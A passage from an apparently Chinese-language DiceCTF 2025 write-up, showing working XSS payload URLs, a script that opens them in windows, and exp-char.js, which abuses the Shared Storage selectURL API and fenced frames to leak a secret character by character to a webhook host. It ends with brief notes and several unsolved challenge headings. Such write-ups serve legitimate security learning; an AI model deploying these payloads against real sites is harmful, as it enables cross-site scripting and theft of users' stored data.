  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=89&position=0"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ab&position=1"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ef&position=2"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=89&position=3"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ab&position=4"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=23&position=5"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=01&position=6"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ab&position=7"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=23&position=8"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ef&position=9"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=01&position=10"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=01&position=11"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ef&position=12"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=01&position=13"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=ab&position=14"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-char.js?chars=cd&position=15"></script></body></html>')
];


const openedWindows = [];


function openWindowWithUrl(url, index) {
  try {

    const win = window.open(url, `window_${index}`, 'width=500,height=500');
    
    if (win) {
      openedWindows.push(win);
            return true;
    } else {
            return false;
    }
  } catch (error) {
        return false;
  }
}

function openAllWindows() {
    
  urlsToOpen.forEach((url, index) => {
    setTimeout(() => {
      openWindowWithUrl(url, index);

      if (index === urlsToOpen.length - 1) {
        setTimeout(cleanupWindows, 10000);
      }
    }, 500 * index);
  });
}

function cleanupWindows() {
    openedWindows.forEach((win, index) => {
    if (win && !win.closed) {
      win.close();
          }
  });
}

openAllWindows();

```
#### exp-char.js
exp-char.js 的内容如下，判断单个字符准确内容。
```js
function createAverageUrls(position) {
    if (MIN <= 96) {
        minChar = String.fromCharCode(MIN - 39);
    } else {
        minChar = String.fromCharCode(MIN);
    }

    if (MAX <= 96) {
        maxChar = String.fromCharCode(MAX - 39);
    } else {
        maxChar = String.fromCharCode(MAX);
    }

    return [
        {url: `WEBHOOK_URL/leak?pos=${position}&char=` + minChar},  // 数字 0
        {url: `WEBHOOK_URL/leak?pos=${position}&char=` + maxChar},  // 数字 1
    ];
}

async function leakCharAtPosition(position) {
    const urls = createAverageUrls(position);
    await leakOne(urls, position, MIN, 1);
};

async function leakOne(urls, position, min, length){
    const fencedFrameConfig = await window.sharedStorage.selectURL(
        "select-url", 
        urls, 
        {
            data: { 
                position: position,
                min: min,
                length: length
            },
            resolveToConfig: true,
            keepAlive: true,
        }
    );
    await new Promise(resolve => setTimeout(resolve, 2000));
    document.getElementById('my-fenced-frame').config = fencedFrameConfig;
}

async function leakInformation() {
    const workletCode = `
        class SelectURLOperation {
        
        async run(urls, data) {
            try {
                let message = "default message";
            
                try {
                message = await this.sharedStorage.get("message");
                } catch (e1) {
                try {
                    message = await sharedStorage.get("message");
                } catch (e2) {
                    console.error('get message error:', e2);
                }
                }
                
                if (message && message.length > 0) {
                    let targetChar = message.charCodeAt(data.position);
                    if(targetChar <= 57){
                    targetChar += 39
                    } 

                    return Math.floor((targetChar - data.min) / data.length);
                } 
                return 0;
            } catch (error) {
                console.error('select url error:', error);
                return 'select url error';
            }
        }
        }

        register('select-url', SelectURLOperation);
    `;
    
    const blob = new Blob([workletCode], {type: 'application/javascript'});
    const workletUrl = URL.createObjectURL(blob);
    
    await window.sharedStorage.worklet.addModule(workletUrl);
    
    await leakCharAtPosition(TARGET_POSITION);
    await new Promise(resolve => setTimeout(resolve, 300));
}
leakInformation();
```
期间也想过使用二分或者调用 webhook 的 api 来完成全自动，但为了尽快解题还是使用笨拙一点的办法。

阅读 [DiceCTF 2025 Quals Writeups | 廢文集中區](https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/en/#nobin) 发现作者利用加密算法耗时的差异来构建侧信道，更为巧妙。

## bad-chess-challenge (unsolved)

## old-site-b-side (unsolved)

## dicepass (unsolved)

## safestnote (unsolved)
